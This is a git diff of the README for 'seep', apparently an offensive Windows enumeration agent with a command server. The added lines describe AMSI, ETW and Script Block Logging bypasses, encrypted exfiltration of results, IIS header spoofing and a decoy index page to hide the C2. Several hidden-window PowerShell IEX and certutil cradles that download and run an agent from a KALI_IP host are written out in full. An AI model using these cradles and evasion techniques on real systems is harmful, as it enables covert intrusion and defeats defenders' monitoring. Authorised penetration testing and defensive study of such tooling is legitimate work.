@@ -62,7 +62,7 @@ Every finding maps to ATT&CK techniques with actionable exploitation guidance �
 <td width="50%">
 
 ### Fileless Execution
-Agent runs entirely in memory via IEX cradle. Results are compressed with `System.IO.Compression`, uploaded over HTTP, and never touch disk unless you ask.
+Agent runs entirely in memory via IEX cradle. Results are AES-256-CBC encrypted, compressed, and uploaded over HTTP. AMSI/ETW/Script Block Logging bypassed automatically. Zero disk footprint.
 
 </td>
 </tr>
@@ -76,7 +76,7 @@ Dark-themed, self-contained HTML — no CDN, no external requests. Executive sum
 <td width="50%">
 
 ### Modular Agent Composer
-Cherry-pick checks with `--checks` / `--exclude`. Apply string obfuscation with `--obfuscate`. Strip comments. The composer assembles a single `.ps1` from 16 independent modules.
+Cherry-pick checks with `--checks` / `--exclude`. Apply identifier randomization with `--obfuscate` — function names, variables, HTTP headers, and check prefixes are all randomized. The composer assembles a single `.ps1` from 16 independent modules.
 
 </td>
 </tr>
@@ -136,14 +136,14 @@ seep catalog download --all --workdir /tmp/op1
 # Start server
 seep serve --workdir /tmp/op1
 
-# On target — fileless one-liner:
-powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1'); Invoke-Seep"
+# On target — the server prints ready-to-use cradles with auth tokens
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"
 
 # Generate report from uploaded results
 seep report /tmp/op1/results/results_*.json --format html --output report.html
 ```
 
-> The default HTTP port is `80` (agent delivery + tool downloads) with upload on port `8000`. Override with `--port` and `--upload-port`. Use `--tls` for HTTPS.
+> The default HTTP port is `80` (agent delivery + tool downloads) with upload on port `8000`. Override with `--port` and `--upload-port`. Use `--tls` for HTTPS. The server auto-generates an auth token on `init` and prints download cradles with the token on startup.
 
 ---
 
@@ -152,17 +152,14 @@ seep report /tmp/op1/results/results_*.json --format html --output report.html
 ### Running the Agent
 
 ```bash
-# Fileless — agent downloads and auto-executes, results uploaded in memory
-powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1'); Invoke-Seep"
+# Fileless — agent downloads, auto-executes, results AES-encrypted and uploaded
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"
 
 # Stealth variant — no profile, hidden window
-powershell -ep bypass -NoP -W Hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1'); Invoke-Seep"
+powershell -ep bypass -NoP -W Hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"
 
-# iwr alternative
-powershell -ep bypass -c "iex((iwr 'http://KALI_IP/agent.ps1' -UseBasicParsing).Content); Invoke-Seep"
-
-# certutil bypass (when WebClient is blocked)
-certutil -urlcache -split -f http://KALI_IP/agent.ps1 %TEMP%\agent.ps1 && powershell -ep bypass -c ". %TEMP%\agent.ps1; Invoke-Seep"
+# certutil bypass (when WebClient is blocked) — auto-cleans up
+certutil -urlcache -split -f http://KALI_IP/agent.ps1?token=TOKEN %TEMP%\s.ps1 && powershell -ep bypass -c ". %TEMP%\s.ps1; Remove-Item %TEMP%\s.ps1 -Force"
 
 # Custom agent with specific checks only
 seep compose --checks system_info,user_privileges,services --output agent.ps1
@@ -365,14 +362,14 @@ seep/
 │   ├── config.py               # ServerConfig dataclass with YAML serialization
 │   ├── agent/
 │   │   ├── checks/             # 16 PowerShell check modules
-│   │   │   ├── _base.ps1       # Shared helpers (New-Finding, Write-Status)
+│   │   │   ├── _base.ps1       # Shared helpers (New-Finding, Write-Status, Invoke-Evasion)
 │   │   │   ├── system_info.ps1
 │   │   │   ├── user_privileges.ps1
 │   │   │   ├── network.ps1
 │   │   │   └── ...
 │   │   ├── templates/
 │   │   │   └── agent_wrapper.ps1   # Invoke-Seep entry point
-│   │   └── composer.py         # Assembles checks into single .ps1
+│   │   └── composer.py         # Assembles checks into single .ps1, identifier randomization
 │   ├── catalog/
 │   │   ├── tools.yaml          # 93 tool definitions (SHA256, categories, MITRE triggers)
 │   │   ├── schemas.py          # ToolEntry, ToolCatalog, CategoryDef
@@ -390,7 +387,7 @@ seep/
     ├── conftest.py             # Shared fixtures
     ├── fixtures/
     │   └── sample_results.json # 10 realistic findings for testing
-    └── test_*.py               # 112 tests across 9 files
+    └── test_*.py               # 391 tests across 12 files
 ```
 
 ### Data Flow
@@ -398,13 +395,14 @@ seep/
 ```
 seep serve                                    Target (Windows)
     │                                              │
-    │  GET /agent ─────────────────────────────►  IEX download
+    │  GET /agent.ps1?token=T ───────────────►  IEX download
     │                                              │
-    │                                         Invoke-Seep runs
-    │                                         16 checks → JSON
+    │                                     AMSI / ETW / SBL bypass
+    │                                     Invoke-Seep runs (auto)
+    │                                     16 checks → JSON
     │                                              │
-    │  POST /upload  ◄─────────────────────────  GZip + upload
-    │                                              │
+    │  POST /api/results  ◄──────────────  AES-256-CBC + GZip
+    │   (auth via token)                           │
     ▼                                              │
 results/results_*.json                             │
     │                                              │
@@ -429,10 +427,12 @@ report.html (self-contained, dark theme)           │
 | **Catalog** | YAML (`pyyaml`) with SHA256 verification |
 | **Downloads** | `urllib.request` with `ThreadPoolExecutor` |
 | **Reports** | Self-contained HTML, Markdown, JSON |
-| **Testing** | pytest (112 tests) |
+| **Testing** | pytest (391 tests) |
 | **Linting** | ruff (E, F, W rules) |
+| **Encryption** | AES-256-CBC via `cryptography` (agent→server) |
+| **Evasion** | AMSI, ETW, Script Block Logging bypasses |
 
-No framework. No Docker. No build step. Just a pip-installable CLI.
+No framework. No Docker. No build step. Just `pip install` with two dependencies (`pyyaml`, `cryptography`).
 
 ---
 
@@ -459,21 +459,45 @@ No framework. No Docker. No build step. Just a pip-installable CLI.
 | **Symlink organization** | Tools organized into `all/`, `categories/{name}/` via relative symlinks |
 | **Security hardened** | Path traversal guards, XSS escaping, CSP headers, input validation |
 | **No external deps at runtime** | Reports have zero CDN calls, agent uses only PowerShell builtins |
+| **AMSI bypass** | Reflection-based AMSI patch in cradle and agent — obfuscated format strings |
+| **ETW bypass** | Disables `PSEtwLogProvider.etwEnabled` to prevent telemetry |
+| **Script Block Logging bypass** | Patches `cachedGroupPolicySettings` to disable SBL |
+| **AES-256-CBC encryption** | Results encrypted with SHA256(auth_token) as key, IV prepended |
+| **Server header spoofing** | HTTP `Server` header reports `Microsoft-IIS/10.0` |
+| **Identifier randomization** | `--obfuscate` randomizes all function names, variables, headers, and check prefixes |
+| **Auth-gated endpoints** | All sensitive endpoints require token auth, return 404 (not 401) on failure |
+| **Benign index page** | Unauthenticated visitors see generic "It works!" — no C2 self-identification |
+| **URL prefix** | Configurable path prefix for endpoint randomization (e.g. `/app`) |
+| **CLM detection** | Agent warns and exits gracefully if Constrained Language Mode is active |
+| **Random TLS CN** | Self-signed cert uses randomized Common Name from plausible hostname pool |
+| **Auto-invoke** | Agent self-executes when auth token is embedded — cradle needs no explicit function call |
+| **Base64 token encoding** | Auth token stored as Base64 in composed agent, decoded at runtime |
 
 ---
 
 ## OPSEC
 
-| Concern | Mitigation |
-|---------|------------|
-| **Disk artifacts** | Fileless by default — upload mode keeps everything in memory |
-| **Detection surface** | `--checks` / `--exclude` to run only what you need |
-| **String signatures** | `--obfuscate` applies string splitting to sensitive tool names |
-| **Network visibility** | `--tls` encrypts transport with self-signed cert |
-| **Timing patterns** | Configurable jitter between checks reduces burst telemetry |
-| **Console noise** | Quiet mode suppresses agent output during execution |
-| **PowerShell version** | PS3+ only — clean codebase, no legacy compatibility bloat |
-| **Check shuffling** | Randomize check execution order to avoid fingerprinting |
+| Layer | Protection | Detail |
+|-------|-----------|--------|
+| **Pre-download** | AMSI bypass in cradle | Format-string obfuscated patch runs before agent download |
+| **Runtime evasion** | ETW + Script Block Logging | `PSEtwLogProvider.etwEnabled` disabled, `cachedGroupPolicySettings` patched |
+| **Language mode** | CLM detection | Agent detects Constrained Language Mode and warns before proceeding |
+| **Network (server)** | Server header spoofing | Returns `Microsoft-IIS/10.0` — no Python/BaseHTTPServer fingerprint |
+| **Network (server)** | Benign index page | Unauthenticated visitors see "It works!" — no C2 indicators |
+| **Network (server)** | Auth-gated endpoints | All sensitive routes return 404 without valid token (not 401/403) |
+| **Network (server)** | URL prefix | Configurable path prefix (e.g. `/app`) to avoid default path fingerprinting |
+| **Network (server)** | Random TLS CN | Self-signed cert uses hostname from plausible pool (mail.local, srv01.corp.local, etc.) |
+| **Network (transport)** | AES-256-CBC encryption | Results encrypted with `SHA256(auth_token)` key, IV prepended, then GZip compressed |
+| **Agent identity** | Identifier randomization | `--obfuscate` randomizes all function names, variables, HTTP headers, check prefixes |
+| **Agent identity** | Comment stripping | `--strip-comments` removes all PowerShell comments from composed agent |
+| **Agent identity** | Base64 token encoding | Auth token stored as Base64 in agent, decoded at runtime |
+| **Disk artifacts** | Fileless by default | IEX cradle, in-memory execution, no disk writes |
+| **Disk artifacts** | Cleanup on disk cradles | certutil/curl cradles use `s.ps1` temp name and auto-delete with `Remove-Item` |
+| **Detection surface** | Selective checks | `--checks` / `--exclude` to run only what you need |
+| **Timing** | Configurable jitter | Jitter between checks reduces burst telemetry patterns |
+| **Timing** | Check shuffling | Randomize check execution order to avoid fingerprinting |
+| **Console noise** | Auto-quiet in fileless | Quiet mode activates automatically in fileless execution |
+| **Catalog** | Generic User-Agent | Tool downloads use a standard Chrome User-Agent string |
 
 ---
 
@@ -528,7 +552,7 @@ pip install -e ".[dev]"
 ### Testing
 
 ```bash
-# All 112 tests
+# All 391 tests
 python -m pytest tests/ -v
 
 # With coverage
@@ -612,7 +636,7 @@ Edit `server/report/recommendations.py` and add an entry to the `RECOMMENDATIONS
 1. Fork the repository
 2. Create a feature branch (`git checkout -b feature/new-check`)
 3. Make your changes
-4. Run `python -m pytest tests/` — all 112 tests must pass
+4. Run `python -m pytest tests/` — all 391 tests must pass
 5. Commit with a descriptive message
 6. Open a Pull Request
 
